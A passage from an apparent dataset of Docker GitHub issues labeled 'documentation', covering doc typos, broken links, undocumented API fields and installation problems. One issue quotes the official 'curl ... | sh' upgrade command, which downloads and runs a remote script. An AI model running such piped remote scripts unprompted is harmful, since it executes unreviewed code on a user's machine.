/usr/local/bin/docker\n Docker Root Dir: /mnt/sda1/var/lib/docker\nUsername: felixge\nRegistry: https://index.docker.io/v1/\nLabels:\n provider=virtualbox\n`uname -a`:\nDarwin Felix-MBP-2012.local 15.0.0 Darwin Kernel Version 15.0.0: Sat Sep 19 15:53:46 PDT 2015; root:xnu-3247.10.11~1/RELEASE_X86_64 x86_64\n\nVirtualBox:  5.0.10 r104061\n\nSteps to Reproduce:\n1. Follow the tutorial\n2. Overwrite one of the html files with e.g. \"echo 1235\" > index.html after initially creating it\n3. Reload the file in the browser\n\nYou may need to overwrite several times with different data to see the problem. I've also found that `echo <data> > <file>`  produces the problem more reliably than editing it with vim.\n\nIdeally this bug could be fixed in VirtualBox. But short of that, I think the best solution is to create a dedicated description of this as a \"known issue\" somewhere, and link to that article from the installation tutorial, as well as other tutorials that make use of nginx / containers that are using sendfile.\n"},{"labels":["documentation",null],"text":"MHN requires 3.16.  Our installation documentation should mention this and cover the  upgrade of the kernel. \n"},{"labels":["documentation"],"text":"in doc https://github.com/docker/docker/blob/master/experimental/userns.md it only said, for example:\n\nThe following standard Docker features are currently incompatible when running a Docker daemon with experimental user namespaces enabled:\n\n```\nsharing namespaces with the host (--pid=host, --net=host, etc.)\n```\n\nWhen I enabled user namespace  feature, and try this\n\n$ docker run -it --ipc=host  ubuntu /bin/sh\n# \n\n~$ docker run -it --uts=host  ubuntu bash\nroot@dockerexper:/# \n\nBoth can works, I did not know what \" etc\" . here means and  what's the issue with pid or net ? what's failure for that, without it, it can not verify if this feature is work as design or not.\n"},{"labels":["documentation"],"text":"I believe the pull command list in [this section](https://docs.docker.com/userguide/dockerimages/#image-digests) is incorrect.\n\nHas:\n\n```\n$ docker pull ouruser/sinatra@cbbf2f9a99b47fc460d422812b6a5adff7dfee951d8fa2e4a98caa0382cfbdbf\n```\n\nShould be:\n\n```\n$ docker pull ouruser/sinatra@sha256:cbbf2f9a99b47fc460d422812b6a5adff7dfee951d8fa2e4a98caa0382cfbdbf\n```\n"},{"labels":["documentation"],"text":"https://docs.docker.com/reference/api/docker_remote_api/\n\n![image](https://cloud.githubusercontent.com/assets/668860/10025840/2b075478-6113-11e5-8b6c-b07477b1e507.png)\n"},{"labels":["documentation"],"text":"$ docker version\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:12:04 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:12:04 UTC 2015\n OS/Arch:      linux/amd64\n\nFollow this guide  https://docs.docker.com/engine/reference/run/\nPID setting part: it has reference run \"docker run --pid=host rhel7 strace -p 1234\"\n\n$ docker run --pid=host rhel7 strace -p 1234\nUnable to find image 'rhel7:latest' locally\nPulling repository docker.io/library/rhel7\n6883d5422f4e: Download complete \nStatus: Downloaded newer image for rhel7:latestr.io/library/rhel7 \ndocker.io/library/rhel7: this image was pulled from a legacy registry.  Important: This registry version will not be supported in future versions of docker.\nexec: \"strace\": executable file not found in $PATH\nError response from daemon: Cannot start container ed48301d82536e4ff30d83f4c15a146661252fe60ddac50943de21572e01881e: [8] System error: exec: \"strace\": executable file not found in $PATH\n"},{"labels":["documentation"],"text":"The default network driver (I.e. Bridge) has additional options that can be passed when creating a custom network, these options aren't documented (unless I overlooked). We should add the options to the documentation.\n\nFor reference, see https://github.com/docker/docker/issues/18237#issuecomment-161737492\n"},{"labels":["documentation",null,null,null],"text":"I was quite surprised and disappointed when the installer said that it requires x64.\n\nYou should specify this \"little\" detail somewhere on the Docker site: in filename and on a couple of pages, like [here](https://docs.docker.com/windows/step_one/) and [here](https://www.docker.com/docker-toolbox), I think, so people know that it won't work on their x86 Windows BEFORE they download and try to install Docker.\n"},{"labels":["documentation",null],"text":"Found this when reading docs.docker.com;\nhttps://docs.docker.com/engine/reference/\n\nThat page is published using 192.168.99.100 as domain name\n\n<img width=\"1738\" alt=\"screen shot 2015-12-01 at 13 00 13\" src=\"https://cloud.githubusercontent.com/assets/1804568/11500207/e6f469ba-982b-11e5-8941-0d11a86d876f.png\">\n"},{"labels":["documentation",null,null,null],"text":"I'm sorry if this is a tiresome topic, but I can't find a good answer.\n\nI have started to look for which storage driver to use for my Docker machines in production.\nOverlayfs looked like the one to use, so I tried it out, getting a ton of errors with socket files. Then I started getting weird errors if a layer was deleting from another layer on buildtime. Switching to ext4 as backing filesystem instead of xfs for the overlay driver solved that. \nIt's confusing to need to dig down all this old issues to figure out that this are mostly known issues.\nIt's also confusing to go from devicemapper (loop) > devicemapper (thin) > overlayfs (with xfs) > overlayfs (with ext4).\n\nThe best that worked for me (less buggy) was actually devicemapper, both loop and thin.\n\nWhat is the \"at the time\" best option? Whats the pros and cons?\nMaybe this should be a part of the documentation that is updated from time to time. A matrix-style overview.\n"},{"labels":["documentation",null],"text":"For installing docker on cloud platforms we want to direct people to install machine and then deploy docker. \n\n@londoncalling I'd like you to do this update.  \n\ncc @shykes \n"},{"labels":["documentation",null],"text":"Hi, I have the latest win 10 build and got some problems following the guide:\n\nAdd ssh.exe to your PATH\n$Env:Path = \"${Env:Path};c:\\Program Files (x86)\\Git\\bin\"\n\nshould be\n\n$Env:Path = \"${Env:Path};c:\\Program Files (x86)\\Git\\bin;C:\\Program Files\\Git\\mingw64\\bin\"\n\nand the \"eval\" command isn't working in my PS. I setuped the ENV variables by hand\n"},{"labels":["documentation"],"text":"User asked on Stackoverflow.\n\nhttp://stackoverflow.com/questions/33784295/setting-dns-for-docker-daemon-using-systemd-drop-in\n"},{"labels":["documentation",null],"text":"I'm using the debian package from https://apt.dockerproject.org/repo/ on version 1.9.0-0~vivid and the --volume-driver option is not documented in the man page. It appears in the `docker run --help` but not in `man docker run`.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/engine/userguide/networkingcontainers/ - one of the examples is missing --format (or -f) parameter.  In the \"Add containers to a network\" section, after the words:\n\"Then, get the IP address of your web\", there is an example:\n\n```\n$ docker inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' web\n```\n\nIt should be, similar to the one above:\n\n```\n$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' web\n```\n\notherwise the user gets an error:\n\n```\n$ docker inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' certsignd\nError: No such image or container: {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\n```\n\nand a very long JSON blob with the full config.\n"},{"labels":["documentation"],"text":"Title says it all\n"},{"labels":["documentation"],"text":"Being able to install a specific version of docker is a recurring question (see for example https://github.com/docker/docker/issues/9697, https://github.com/docker/docker/issues/13191, https://github.com/docker/docker/issues/13822, https://github.com/docker/docker/issues/15581, https://github.com/docker/docker/issues/15586, https://github.com/docker/docker/issues/15947)\n\nWe currently describe how to download a specific (static) binary on http://docs.docker.com/engine/installation/binaries/, but don't provide that information on how to do this using apt, yum, or dnf.\n\nWhile this may be \"general knowledge\" on working with package managers, it would be a nice addition to explain users how to do this (and how to \"pin\" to a specific major/minor version)\n\nfor example, on ubuntu\n\n``` bash\napt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\nmkdir -p /etc/apt/sources.list.d\necho deb https://apt.dockerproject.org/repo3 ubuntu-trusty main > /etc/apt/sources.list.d/docker.list\napt-get update;\napt-get install -y -q docker-engine=1.x.x~\n```\n"},{"labels":["documentation"],"text":"The page https://docs.docker.com/engine/articles/security/#linux-kernel-capabilities links to the removed https://github.com/docker/docker/blob/master/daemon/execdriver/native/template/default_template.go instead of https://github.com/docker/docker/blob/master/daemon/execdriver/native/template/default_template_linux.go.\n## Possible solution to the maintenance problem\n\nYou might want to use a link to a specific version (which is never going to break) and update it as needed/wanted; if updates are forgotten, users can at least try to navigate through to a more recent version. Additionally, when pointing to a specific version, it becomes possible to link to specific lines _robustly_, that is, without having to update line numbers at each change.\n\nhttps://github.com/docker/docker/blob/87de5fdd5972343a11847922e0f41d9898b5cff7/daemon/execdriver/native/template/default_template_linux.go#L16-L29\n"},{"labels":["documentation",null],"text":"In this page: http://docs.docker.com/engine/userguide/dockerimages/\n\nInstead of \"Tip: You recommend you always use a specific tagged image, for example ubuntu:12.04. That way you always know exactly what variant of an image is being used.\", it should be \"Tip: We recommend you always use a specific tagged image, for example ubuntu:12.04. That way you always know exactly what variant of an image is being used.\"\n"},{"labels":["documentation"],"text":"I'm on a Mac OS X and following the [Get started with multi-host networking](https://docs.docker.com/engine/userguide/networking/get-started-overlay/) tutorial:\n\nIn Step 2, the following command fails after 60 retries:\n\n```\n$ docker-machine create \\\n-d virtualbox \\\n--swarm --swarm-image=\"swarm\" --swarm-master \\\n--swarm-discovery=\"consul://$(docker-machine ip mh-keystore):8500\" \\\n--engine-opt=\"cluster-store=consul://$(docker-machine ip mh-keystore):8500\" \\\n--engine-opt=\"cluster-advertise=eth1:2376\" \\\nmhs-demo0\n```\n\nwhen I add `--debug`, I see:\n\n```\n...\nDaemon not responding yet: dial tcp 192.168.99.101:2376: connection refused\nDaemon not responding yet: dial tcp 192.168.99.101:2376: connection refused\nDaemon not responding yet: dial tcp 192.168.99.101:2376: connection refused\n...\n```\n\nBut I can actually connect to this engine from my host machine (Mac OS X) like:\n\n```\n$ docker ...  '-H=tcp://192.168.99.100:2376' ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                            NAMES\nfdc11fc1609c        progrium/consul     \"/bin/start -server -\"   19 minutes ago      Up 19 minutes       53/tcp, 53/udp, 8300-8302/tcp, 8400/tcp, 8301-8302/udp, 0.0.0.0:8500->8500/tcp   nostalgic_visvesvaraya\n```\n# Debug info\n\n```\n➜  ~  docker info\nContainers: 1\nImages: 18\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 20\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.0.9-boot2docker\nOperating System: Boot2Docker 1.8.1 (TCL 6.3); master : 7f12e95 - Thu Aug 13 03:24:56 UTC 2015\nCPUs: 1\nTotal Memory: 996.2 MiB\nName: mh-keystore\nID: ZCBE:XISI:3ZBC:NDXW:ASIH:V6RI:CON4:VNVJ:LOHU:LZ4S:6Q4D:KETE\nDebug mode (server): true\nFile Descriptors: 15\nGoroutines: 27\nSystem Time: 2015-11-09T23:31:18.109537018Z\nEventsListeners: 0\nInit SHA1:\nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\nUsername: ahmet\nRegistry: https://index.docker.io/v1/\nLabels:\n provider=virtualbox\n\n➜  ~  docker version\nClient:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.5\n Git commit:   d12ea79\n Built:        Mon Aug 31 22:27:45 UTC 2015\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   d12ea79\n Built:        Thu Aug 13 02:49:29 UTC 2015\n OS/Arch:      linux/amd64\n```\n\n```\n➜  ~  docker-machine -v\ndocker-machine version 0.4.1 (e2c88d6)\n```\n"},{"labels":["documentation",null],"text":"We should use on-premises not on-premise.\n"},{"labels":["documentation"],"text":"I just installed docker on my laptop with Ubuntu 14.04 and I just got a big scare, as my system ran out of space, and kept using all the space I did free.\nThis was due to /var/lib/docker/aufs/timeshift using up everything.\nIt turns out by default timeshift does not skip /var/lib, so one has to add an explicit exclusion.\nNot docker fault, but it would be good to have an \"head's up\" somewhere, in the installation info for ubuntu.\n"},{"labels":["documentation"],"text":"This is just hanging there in an odd place.\n\nhttp://docs.docker.com/engine/userguide/labels-custom-metadata/\n"},{"labels":["documentation"],"text":"Add Adam/Betty's list to docs.\n"},{"labels":["documentation",null],"text":"Looks like some code was removed in #17700 but not entirely removed throughout the docs.  Verify the docs were cleaned properly.\n"},{"labels":["documentation"],"text":"I was reading through the contribution documentation, and under the section https://github.com/docker/docker/blob/master/CONTRIBUTING.md#design-and-cleanup-proposals, there's a link to http://docs.docker.com/opensource/project/advanced-contributing/ for advanced contributor details. That link leads to a blank page (not a 404 - just a blank page).\n\nWanted to let y'all know about the broken link as well as ask where I could find the details on how you're asking folks to present design and refactor concepts to the project.\n\nThanks!\n\n-joe\n"},{"labels":["documentation",null,null],"text":"I started to experiment with volume plugins yesterday, had a bunch of questions, pestered my coworkers, tortured my Docker Engine, got answers, and here's some feedback (pre @thaJeztah's request).\n## How can I use two different plugins?\n\nWhen reading the docs, I wondered how I could start a container using two volumes with two different drivers. The [volume plugins docs](http://docs.docker.com/engine/extend/plugins_volume/) say nothing about this, nor do the `docker run` page.\n\nThe answer is to create the volumes separately with `docker volume` and then start the container.\n## Impact on `VOLUME`\n\nThen I wondered: \"since I have to use `docker volume`, do we really need `--volume-driver`, then?\" and it was pointed out that `--volume-driver` will be used for the implicit `VOLUME`s defined in the Dockerfile.\n\nI think the docs should also clarify that.\n## Terminology\n\nIt could be useful to clarify what is a `plugin` and what is a `driver`. Are they interchangeable, or is there a subtlety? (Like, \"a plugin can provide multiple drivers\" maybe?)\n"},{"labels":["documentation",null],"text":"Need to document the exact  required TCP/UDP ports to be open in order for overlay networks to work:\n\nengine port (e.g TCP 2376), \nvxlan: UDP 4789\nserf: TCP + UDP 7946\nkey-value store ( e.g for consul TCP 8500) \n\nAdditionally, in `Understand Docker container networks`\nneed to edit `--cluster-advertise=HOST_IP` and make it `--cluster-advertise=HOST_IP:ENGINE_PORT` or `--cluster-advertise=HOST_INTERFACE:ENGINE_PORT` \n"},{"labels":["documentation",null],"text":"Just worked through the examples at https://docs.docker.com/engine/userguide/networking/get-started-overlay/ and have the following corrections/suggestions:\n\nStep 2.2 - should this now just be --swarm-image=\"swarm\" rather than --swarm-image=\"swarm:1.0.0-rc2\" ?\n\nStep 4 - given that constraints are specified, any reason why the docker run commands are targeted at the individual nodes rather than the swarm master?\n\nStep 6.3 - doesn't indicate that the file needs to be in a directory called counter\nStep 6.4 - specifies a node constraint that is not consistent with those created earlier in the article\nStep 6.6 - has an extraneous 'up' after 'docker-compose' which is hard to diagnose from the usage instructions that you then get back given that the experimental option is not documented\nStep 6.x - would be good to have a final step to browse to the app\n"},{"labels":["documentation",null],"text":"The manual installation procedure for ubuntu doesn't install the requirements for aufs. we should add it to the requirements, because aufs is our recommended/default driver on ubuntu\n"},{"labels":["documentation"],"text":"Just built the latest version of the docs and noticed minor update would be required to [Organize our issues page](http://docs.docker.com/opensource/ways/issues/) for missing reference to `Windows` platform. Jump to section ===> `How Do I triage ?`\n\n```\nkitematic/kitematic     Kitematic is a simple application for managing Docker containers on Mac OS X.\n```\n\nshould be replaced to \n\n```\nkitematic/kitematic     Kitematic is a simple application for managing Docker containers on Mac OS X and Windows.\n```\n"},{"labels":["documentation",null],"text":"Hi ,\nI am using docker remote api version 1.19 and using below request to pull image. \nPOST /images/create?fromImage=ubuntu HTTP/1.1\n\nAbove request have Content-Type: application/json but it is not returning a valid json.\nIn case of wrong image it return \n{\"status\":\"Pulling repository docker.io/library/cento\"}\n{\"errorDetail\":{\"message\":\"Error while pulling image: Get https://index.docker.io/v1/repositories/library/cento/images: dial tcp: lookup index.docker.io: no such host\"},\"error\":\"Error while pulling image: Get https://index.docker.io/v1/repositories/library/cento/images: dial tcp: lookup index.docker.io: no such host\"}\n\nwhich is not a valid json so i am unable to send the proper response.\n"},{"labels":["documentation",null],"text":"Add more detail in Docs about each event state shown in this diagram: http://docs.docker.com/reference/api/docker_remote_api/#docker-events\n\nCloses #10654\n"},{"labels":["documentation",null,null],"text":"Please refer to #17205 \n\nThe documentation should be updated to differentiate between SystemD and normal init scripts when configuring changes to the startup options for docker.\n"},{"labels":["documentation"],"text":"I followed the site https://docs.docker.com/articles/https/\nbut at the end , docker --tlsverify ps  return an erro \n\n```\nAn error occurred trying to connect: Get https://xxxxx/v1.20/containers/json: x509: certificate signed by unknown authority\n```\n\nIf i test the same URL with CURL:\ncurl https://xxxxx/images/json   --cert ~/.docker/cert.pem   --key ~/.docker/key.pem   --cacert ~/.docker/ca.pem\n\nit return Json info.\n\nHow can i use TLS conf with auto signed CA?\n"},{"labels":["documentation",null],"text":"This page has a broken link https://docs.docker.com/userguide/image_management/ - links to https://docs.docker.com/dockter-trusted-registry but should https://docs.docker.com/docker-trusted-registry\n"},{"labels":["documentation",null],"text":"https://docs.docker.com/installation/ubuntulinux/\n\nThis:\n\n```\n$ apt-key adv --keyserver hkp://pgp.mit.edu:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n```\n\nShould be:\n\n```\n$ sudo apt-key adv --keyserver hkp://pgp.mit.edu:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n```\n\nAnd `sudo usermod -aG docker ubuntu` is listed under optional configurations, but that step is most definitely required.\n"},{"labels":["documentation"],"text":"The [names-generator states](https://github.com/docker/docker/blob/ab31d9500ebe0c3bf039321bb8c83c7b01c21e4e/pkg/namesgenerator/names-generator.go#L76-L77);\n\n```\n// Docker, starting from 0.7.x, generates names from notable scientists and hackers.\n// Please, for any amazing man that you add to the list, consider adding an equally amazing woman to it, and vice versa.\n```\n\nWe may want to be more specific about what we consider \"notable\", and what \"rules\" we use when adding people to this list. This came up a few times in the past, i.e. \"being a CEO or founder of a company\" does not per-definition make a person \"notable\".\n\nFor reference, see the discussion in https://github.com/docker/docker/pull/17156 and https://github.com/docker/docker/pull/15218#discussion_r36033279\n"},{"labels":["documentation"],"text":"Links are being deprecated with the implementation of the new networking material. We need to update the `trust_sandbox.md` example to use docker networking rather than links.\n\nping @endophage  @NathanMcCauley @diogomonica \n"},{"labels":["documentation",null,null],"text":"![image](https://cloud.githubusercontent.com/assets/1347209/10561981/fc412bd8-74f8-11e5-83ef-034953b5454e.png)\n"},{"labels":["documentation",null],"text":"The current \"usage\" for commands is in many cases not very helpful, for example if I want to see which filters are supported for `docker ps`:\n\n``` bash\n$ docker ps --filter\nflag needs an argument: --filter\nSee 'docker ps --help'.\n\n$ docker ps --help\n\nUsage:  docker ps [OPTIONS]\n\nList containers\n\n  -a, --all=false       Show all containers (default shows just running)\n  --before=             Show only container created before Id or Name\n  -f, --filter=[]       Filter output based on conditions provided\n  --format=             Pretty-print containers using a Go template\n  --help=false          Print usage\n  -l, --latest=false    Show the latest created container, include non-running\n  -n=-1                 Show n last created containers, include non-running\n  --no-trunc=false      Don't truncate output\n  -q, --quiet=false     Only display numeric IDs\n  -s, --size=false      Display total file sizes\n  --since=              Show created since Id or Name, include non-running\n```\n\nThe information does not give any clue what filters are available.\n\nWe should try to improve this output and, if possible, reuse the existing documentation (man-pages, docs) to prevent having to maintain this information in three locations (usage, man-page, docs).\n"},{"labels":["documentation"],"text":"Move the how to contribute to open source documentation to the opensource project.\n"},{"labels":["documentation"],"text":"The `GET /volumes` remote api [query parameter](https://github.com/docker/docker/blob/master/api/server/router/local/volume.go#L17) \"**filters**\" (plural) is consistent with similar list commands (e.g. `GET /images`), but the [v1.21 docs](https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.21.md#list-volumes) state that the parameter is named \"**filter**\" (singular).\n\nWhich one is correct? I guess the docs are wrong, and if so, I could provide a PR to fix them. If the docs are right and the param was meant to be **filter** (singular), I'd like to discuss about consistency to the other endpoints ;-)\n"},{"labels":[null,"documentation"],"text":"[The docker-maven-plugin](https://github.com/spotify/docker-maven-plugin) can be used for Maven projects to push an image to the user's configured Docker registry at certain points in the build process. The plugin uses [the docker-client library](https://github.com/spotify/docker-client), which communicates with the docker daemon using the Remote API.\n\nWhen pushing an image, we would like for the plugin to be able to be aware of the registry-assigned digest for the image, so that it can be communicated to downstream plugins / build steps.\n\ndocker-client tries to find the image digest by basically grepping through the JSON status messages sent by the /push endpoint. We (docker-maven-plugin maintainers) [discovered that in docker v1.8 the format of the message changed](https://github.com/spotify/docker-client/issues/250) from\n\n```\nDigest: sha256:dbad7f727f340f4bfa1160689eaf57a60242bf9a48cc2c4c14f383c9b66e8f06\n```\n\nto something like \n\n```\n0.2.1-SNAPSHOT-efd3f71.DIRTY: digest: sha256:8138f3c93c333aa1db6634ae77fce1a50febb9b189ba6fb2121f22810b7841b3 size: 41358\n```\n1. Would it be possible to document the format of the status message containing the image digest to make it less susceptible to unintended changes in future docker versions?\n2. Is there a smarter way for the docker-client library to get the image digest after/during a push?\n"},{"labels":["documentation"],"text":"I followed the installation steps at https://docs.docker.com/installation/debian/ for Debian Wheezy. However, I was unable to install the package docker-engine because of this error:\n\n`The following packages have unmet dependencies: docker-engine : Depends: init-system-helpers (>= 1.18~) but it is not installable`\n\nIn issue https://github.com/docker/machine/issues/1607 I read that if support for Wheezy is requested, an issue should be openend - which I'm doing with this.\n\nWe have a large cluster currently running many Debian Wheezy machines. They won't be upgraded to Debian 8 in the foreseeable future, so support for Debian 7 would be highly appreciated.\n"},{"labels":["documentation"],"text":"Reported by \"univahpollinger\" on IRC; ([logs](https://botbot.me/freenode/docker-dev/msg/51414351/);\n\n> I'm running Docker 1.8.2 and use the RemoteAPI. The response on a \"GET /containers/<id>/stats\" request contains a \"precpu_stats\" field - this is not documented, but is the exact copy of the \"cpu_stats\" field - is the \"precpu_stats\" field intended - what is this then? - or is it just a copy&paste error in the code?\n\nPR https://github.com/docker/docker/pull/13320 introduced a `precpu_stats` field in the stats, but this field has not been documented\n\nping @coolljt0725 :smile:\n"},{"labels":["documentation",null],"text":"The \"configuring docker\" section is not updated to reflect the new packages, which no longer use /etc/sysconfig/docker on SystemD; https://docs.docker.com/engine/articles/configuring/#configuring-docker-1\n\nInstallation articles duplicate a lot of this same content.  Updating this should include fixing that material; we might want to update the installs to link to configuring rather than having a lot of material duplicated all around.\n\nSee #16662 for the origination story behind this issue\n"},{"labels":["documentation"],"text":"```\nubuntu@server:~$ docker version\nClient version: 1.7.1\nClient API version: 1.19\nGo version (client): go1.4.2\nGit commit (client): 786b29d\nOS/Arch (client): linux/amd64\nServer version: 1.7.1\nServer API version: 1.19\nGo version (server): go1.4.2\nGit commit (server): 786b29d\nOS/Arch (server): linux/amd64\n\nubuntu@server:~$ docker info\nContainers: 8\nImages: 63\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 79\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.13.0-58-generic\nOperating System: Ubuntu 14.04.2 LTS\nCPUs: 2\nTotal Memory: 3.859 GiB\nName: ************\nID: 36XS:MMPO:MGBK:EEKA:T2UF:QJKH:FROW:EARP:G7MJ:ATXF:C3WT:5ZTQ\nWARNING: No swap limit support\n\nubuntu@server:~$ uname -a\nLinux ************ 3.13.0-58-generic #97-Ubuntu SMP Wed Jul 8 02:56:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n```\n# Steps to reproduce the issue:\n1. Open the official \"Installation on Ubuntu\" documentation page\n2. Go to the Upgrade section https://docs.docker.com/installation/ubuntulinux/#upgrade-docker\n3. Run the suggested command in order to upgrade from 1.7.1 to the current stable version (1.8.2)\n   \n   `$ curl -sSL https://get.docker.com/ | sh`\n\nI received the following message:\n`Warning: the \"docker\" command appears to already exist on this system.\nIf you already have Docker installed, this script can cause trouble, which is\nwhy we're displaying this warning and provide the opportunity to cancel the\ninstallation.\nIf you installed the current Docker package using this script and are using it\nagain to update Docker, you can safely ignore this message.\nYou may press Ctrl+C now to abort this script.`\n\nWhat I expected:\nI've discovered that I've installed version 1.7.1 using the following command (please see the `/ubuntu` at the end):\n`$ curl -sSL https://get.docker.com/ubuntu | sh`\n\nIf I try to re-run the original command (the one with `/ubuntu`) nothing happens, the version stays at 1.7.1, so I can guess that the new command (the one without `/ubuntu`) is the only one able to perform the upgrade, but it is suggesting me to stop it using CTRL+C because the original installation were not performed using such a script.\n\nIn the end the issue is: I don't know how to proceed because neither the script nor the documentation page are suggesting me what to do in order to upgrade Docker. The only suggestion is to perform CTRL+C and stay with version 1.7.1.\n"},{"labels":["documentation"],"text":"When looking at the [remote API](https://docs.docker.com/reference/api/docker_remote_api_v1.20/), I noticed the links for the versions is sorted incorrectly:\nv1.20 --> v1.21 --> v1.19\n\n![screen shot 2015-10-01 at 8 32 38 pm](https://cloud.githubusercontent.com/assets/679475/10239004/b2adfcc8-687b-11e5-9480-e897eca64f6e.png)\n\nTried looking at the docs in Github, but not sure where this resides?\n"},{"labels":["documentation",null,null],"text":"https://docs.docker.com/reference/commandline/ps/\n\nThe placeholder .Names is missing in available placeholders for\n\n```\ndocker ps  --format\n```\n\n```\nClient:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:21:21 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:21:21 UTC 2015\n OS/Arch:      linux/amd64\n```\n"},{"labels":["documentation",null],"text":"The Dockerfile documentation about the EXPOSE directive states it is used \"to determine which ports to expose to the host when using the -P flag.\"\n\nThen, it goes on to say:\n\n\"Note: EXPOSE doesn’t define which ports can be exposed to the host or make ports accessible from the host by default.\"\n\nIt seems to me the first statement is wrong and should be removed, because AFAIK EXPOSE does not determine which ports to expose to the host.  If I'm wrong about that, than the documentation should be updated with clarification.  \n"},{"labels":["documentation"],"text":"Was open here, but not fixed #3622\n\nThe documentation still don't give any examples on how this works!\n\nhttps://docs.docker.com/reference/api/docker_remote_api_v1.20/#create-a-container\n"},{"labels":["documentation"],"text":"https://twitter.com/scott_lowe/status/647174608844640256\n\nhttps://blog.docker.com/2015/07/new-apt-and-yum-repos/\n"},{"labels":["documentation",null,null],"text":"Description of problem:\nNeither the documentation itself nor the examples in the Remote API documentation (specifically for v1.20, https://docs.docker.com/reference/api/docker_remote_api_v1.20/ ) mention that the \"Content-Length\" field is necessary in all POST requests that have a body.\nThe value in this field is not exactly important, at least as it is larger or equal to the actual body size.\n\n`docker version`:\nClient:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:19:00 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:19:00 UTC 2015\n OS/Arch:      linux/amd64\n\n`docker info`:\nContainers: 98\nImages: 9\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 211\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.13.0-63-generic\nOperating System: Ubuntu 14.04.3 LTS\nCPUs: 4\nTotal Memory: 7.664 GiB\nName: sirius.mydomain.test\nID: OKAA:4QF6:6QJ4:R4SE:IWFG:YJLY:PFFW:YTEK:URCB:MTCV:QCOY:VP3Y\nWARNING: No swap limit support\n\n`uname -a`:\nLinux sirius.mydomain.test 3.13.0-63-generic #103-Ubuntu SMP Fri Aug 14 21:42:59 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n\nEnvironment details (AWS, VirtualBox, physical, etc.):\nPhysical\n\nHow reproducible:\nAlways\n\nSteps to Reproduce:\n1. Execute the following command line in the terminal\n$ echo -e \"POST /containers/4d50a1065a88/copy HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\\r\\n\\\"Resource\\\": \\\"test.txt\\\"\\r\\n}\\r\\n\" | sudo nc -U /var/run/docker.sock\n\nActual Results:\nHTTP/1.1 500 Internal Server Error\nContent-Type: text/plain; charset=utf-8\nServer: Docker/1.8.2 (linux)\nDate: Wed, 23 Sep 2015 08:35:54 GMT\nContent-Length: 4\n\nEOF\nHTTP/1.1 400 Bad Request\n\nExpected Results:\nHTTP/1.1 500 Internal Server Error\nContent-Type: text/plain; charset=utf-8\nServer: Docker/1.8.2 (linux)\nDate: Wed, 23 Sep 2015 08:39:53 GMT\nContent-Length: 59\n\nCould not find the file test.txt in container 4d50a1065a88\n\nAdditional info:\nThe expected result is printed with this command line:\n$ echo -e \"POST /containers/4d50a1065a88/copy HTTP/1.1\\r\\nContent-Type: application/json\\r\\nContent-Length: 1000\\r\\n\\r\\n{\\r\\n\\\"Resource\\\": \\\"test.txt\\\"\\r\\n}\\r\\n\" | sudo nc -U /var/run/docker.sock\n"},{"labels":["documentation"],"text":"docker version: Docker version 1.8.2, build 0a8c2e3\nuname: Linux 13.0-63-generic #103-Ubuntu SMP Fri Aug 14 21:42:59 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n\nI have added the following to my `/etc/init/docker`:\n\n``` bash\nDOCKER_OPTS=\"-H unix:///var/run/docker.sock --log-opt max-size=25m --log-opt max-file=2\"\n```\n\noutput of ps:\n\n```\nroot       928  0.0  0.1 2019352 33980 ?       Ssl  Sep16   4:18 /usr/bin/docker daemon -H unix:///var/run/docker.sock --log-opt max-size=25m --log-opt max-file=2\n```\n\n```\nroot@[redacted]:/var/lib/docker/containers/4ca6a18d58bb6df9d77d30d64f17d208f3e02b3018888143f51522f2dcf8ddff# ls -lah\ntotal 30M\ndrwx------ 2 root root 4.0K Sep 16 19:47 .\ndrwx------ 9 root root 4.0K Sep 16 18:51 ..\n-rw------- 1 root root  30M Sep 21 14:40 4ca6a18d58bb6df9d77d30d64f17d208f3e02b3018888143f51522f2dcf8ddff-json.log\n-rw-r--r-- 1 root root 3.4K Sep 16 19:47 config.json\n-rw-r--r-- 1 root root  764 Sep 16 19:47 